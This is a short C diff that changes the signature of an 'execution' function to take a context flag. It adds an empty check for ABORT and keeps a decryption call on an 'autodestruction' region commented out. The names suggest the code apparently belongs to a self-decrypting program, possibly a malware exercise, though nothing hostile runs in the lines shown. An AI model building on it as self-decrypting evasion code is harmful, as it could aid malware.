@@ -4,9 +4,13 @@
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void execution(const struct s_host *host, struct s_keychain *keychain)
+void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context)
 {
-//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+	if (context != ABORT)
+	{
+		;
+	}
+//		decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
 	(void)keychain;
 	asm volatile
